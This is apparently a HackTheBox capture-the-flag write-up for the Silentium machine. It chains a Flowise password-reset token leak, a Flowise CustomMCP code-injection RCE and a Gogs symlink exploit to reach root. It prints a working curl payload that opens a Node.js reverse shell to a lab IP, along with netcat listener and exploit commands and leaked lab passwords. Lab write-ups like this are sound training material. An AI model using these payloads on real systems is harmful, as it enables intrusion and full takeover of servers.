
## Silentium HTB Writeup
<img width="776" height="244" alt="image" src="https://github.com/user-attachments/assets/39d5ae0f-884b-486d-b89d-14f71c092125" />


### Reconnaissance
Initial enumeration began with directory fuzzing against `http://silentium.htb`. The server returned HTTP 200 for all paths, indicating a catch-all response. This was resolved by using `-ac` for auto calibrate
```
ffuf -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 8753
```
<img width="976" height="540" alt="image" src="https://github.com/user-attachments/assets/43a1aa03-7839-44a0-b445-4bfe7e41d955" />

VHost fuzzing revealed a `staging.silentium.htb` subdomain hosting a **Flowise** instance — an open source AI agent builder. Version enumeration confirmed **Flowise 3.0.5**.

---

### CVE-2025-58434 — Account Takeover via Password Reset Token Disclosure
source: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wgpv-6j63-x5ph

Flowise 3.0.5 is vulnerable to an unauthenticated account takeover. The `/api/v1/account/forgot-password` endpoint accepts an email address and responds with the full user object including a valid `tempToken` — without any email verification or authentication. This token was immediately usable against `/api/v1/account/reset-password` to set a new password for `ben@silentium.htb`, granting admin access to the Flowise UI.

**CVSS: 9.8 Critical**

<img width="978" height="354" alt="image" src="https://github.com/user-attachments/assets/32f7f727-e56b-4d84-8b74-24f632d2cf11" />

---

### CVE-2025-59528 — Remote Code Execution via CustomMCP Node
source: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p

Flowise 3.0.5 contains a critical RCE in the `CustomMCP` node. The `convertToValidJSONString` function passes user-supplied `mcpServerConfig` directly to JavaScript's `Function()` constructor — effectively `eval()` — with full Node.js runtime privileges.

This is **blind RCE** — output is never reflected in the HTTP response, so the "No Available Actions" error is returned regardless of whether execution succeeded. A reverse shell was established using Node.js's native `net` module to avoid shell quoting issues entirely:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const net=process.mainModule.require(\"net\");const cp=process.mainModule.require(\"child_process\");const sh=cp.spawn(\"/bin/sh\",[]);const c=new net.Socket();c.connect(4444,\"10.10.14.165\",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});return 1;})()})"}}'
```

**CVSS: 10.0 Critical**

---

### Post-Exploitation — Container Escape via Environment Variables

The shell landed inside a **Docker container** running as root. Enumerating environment variables revealed credentials stored in plaintext:

<img width="613" height="524" alt="image" src="https://github.com/user-attachments/assets/2dbaaa6c-2134-46b7-972b-5b1a30752cc6" />

```
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
```

The host filesystem was partially mounted at `/root/.flowise` containing `database.sqlite` and `encryption.key`. The `SMTP_PASSWORD` value was reused as the SSH password for user `ben` on the host:

<img width="461" height="78" alt="image" src="https://github.com/user-attachments/assets/0fcade3a-9542-4f73-9115-114c19d893fc" />

This granted SSH access as `ben`, yielding the user flag.

---

### Privilege Escalation — CVE-2025-8110 Gogs RCE as Root
source: https://github.com/TYehan/CVE-2025-8110-Gogs-RCE-Exploit

After landing as `ben`, `linpeas.sh` was uploaded and run to enumerate the system. The key finding was **Gogs 0.13.3** running as root on `127.0.0.1:3001`:

```
root  1496  /opt/gogs/gogs/gogs web
gogs.service: RUNS_AS_ROOT
```

The Gogs config at `/opt/gogs/gogs/custom/conf/app.ini` confirmed `RUN_USER = root` and an open registration policy (`DISABLE_REGISTRATION = false`), meaning any user could register an account.

CVE-2025-8110 is a symlink bypass in the Gogs `PutContents` API that allows an authenticated user to overwrite files outside the repository boundary — including `.git/config`. By injecting a malicious `core.sshCommand` into the config, the next Git operation executed by Gogs triggers the payload as root.

**Exploit steps:**

1. Port forward Gogs to the attack machine:
```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.245.103
```

2. Register an account at `http://127.0.0.1:3001` and generate an API token under `Settings → Applications`.

3. Start a listener:
```bash
nc -lvnp 4444
```

4. Run the PoC:
```bash
python3 exploit.py \
  -u http://127.0.0.1:3001 \
  -un hacker \
  -pw hacker \
  -t <API_TOKEN> \
  -lh 10.10.14.165 \
  -lp 4444
```

The reverse shell connected back as `root`, and the root flag was retrieved from `/root/root.txt`.

<img width="599" height="255" alt="image" src="https://github.com/user-attachments/assets/c5ffdd81-90d6-404d-aa61-c1b8a1da38c3" />
